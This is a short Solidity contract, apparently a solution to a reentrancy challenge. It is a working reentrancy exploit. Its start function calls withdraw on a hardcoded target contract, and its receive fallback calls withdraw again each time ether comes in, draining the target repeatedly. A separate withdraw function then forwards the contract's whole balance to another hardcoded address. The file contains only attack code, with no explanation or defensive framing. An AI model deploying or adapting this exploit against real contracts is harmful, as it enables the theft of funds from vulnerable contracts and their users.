pragma solidity ^0.8.0;

contract ReentrancySolver {
    function withdraw() external {
        address(0xdCC36b9cbC0dbaDBCCFB2f5dD70e5AdB5024F707).call{value: address(this).balance}("cex");
    }

    function startExP() external {
        address(0xB31BA1F98e32774c775a0106f96608D0AF329731).call{value: 0}(abi.encodeWithSignature("withdraw(uint256)", 1000000000000000));
    }

    receive() external payable {
        address(0xB31BA1F98e32774c775a0106f96608D0AF329731).call{value: 0}(abi.encodeWithSignature("withdraw(uint256)", 1000000000000000));
    }
}